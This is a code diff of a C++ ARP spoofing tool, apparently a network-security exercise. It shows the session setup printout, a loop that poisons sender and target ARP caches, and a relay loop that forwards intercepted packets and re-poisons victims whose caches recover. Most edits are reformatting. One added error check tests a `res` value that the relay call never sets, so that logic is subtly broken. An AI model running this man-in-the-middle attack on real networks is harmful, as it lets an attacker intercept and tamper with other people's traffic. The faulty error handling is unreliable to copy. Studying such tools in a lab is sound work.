@@ -68,11 +68,14 @@ int make_session(const char* ifname, Ip sender_ip, Ip target_ip, session* ses) {
 
   // output
   printf("-------------- Session Info --------------\n");
-  printf("Attacker: %s %s\n", std::string(ses->attacker_ip).c_str(),
+  printf("Attacker: %s %s\n",
+         std::string(ses->attacker_ip).c_str(),
          std::string(ses->attacker_mac).c_str());
-  printf("Sender  : %s %s\n", std::string(ses->sender_ip).c_str(),
+  printf("Sender  : %s %s\n",
+         std::string(ses->sender_ip).c_str(),
          std::string(ses->sender_mac).c_str());
-  printf("Target  : %s %s\n", std::string(ses->target_ip).c_str(),
+  printf("Target  : %s %s\n",
+         std::string(ses->target_ip).c_str(),
          std::string(ses->target_mac).c_str());
   return 0;
 }
@@ -82,17 +85,16 @@ void infect_sessions(pcap_t* handle, int SpoofPriod) {
     printf("-------------- Arp Spoofing --------------\n");
     ArpSpoofing* arpSpoofing;
     for (int i = 0; i < 5; i++) {
-      sleep(0.5);
+      sleep(1);
       for (auto ses : sessions) {
         int res =
-            arpSpoofing->arp_infect(handle, ses.attacker_mac, ses.sender_mac,
-                                    ses.sender_ip, ses.target_ip);
+            arpSpoofing->arp_infect(handle, ses.attacker_mac, ses.sender_mac, ses.sender_ip, ses.target_ip);
         if (res < 0) {
           printf("fail to infect\n");
         }
         if (!i)
-          printf("> Infected %s -> %s \n", string(ses.sender_ip).c_str(),
-                 string(ses.target_ip).c_str());
+          printf("> Infected %s -> %s \n",
+                 string(ses.sender_ip).c_str(), string(ses.target_ip).c_str());
       }
     }
     printf("---------- End of Arp Spoofing ----------\n");
@@ -153,13 +155,15 @@ int main(int argc, char* argv[]) {
           received_packet, ses.sender_mac, ses.target_mac);
       if (is_spoofed) {
         // printf(">>> Detect spoofed packet <<<\n");
-        arpSpoofing->relay_spoofed_packet(handle, header, received_packet,
-                                          ses.attacker_mac, ses.target_mac);
+        arpSpoofing->relay_spoofed_packet(handle, header, received_packet, ses.attacker_mac, ses.target_mac);
+        if (res < 0) {
+          printf("fail to relay\n");
+          return -1;
+        }
       }
       if (is_recover) {
         int res =
-            arpSpoofing->arp_infect(handle, ses.attacker_mac, ses.sender_mac,
-                                    ses.sender_ip, ses.target_ip);
+            arpSpoofing->arp_infect(handle, ses.attacker_mac, ses.sender_mac, ses.sender_ip, ses.target_ip);
         if (res < 0) {
           printf("fail to infect\n");
           return -1;
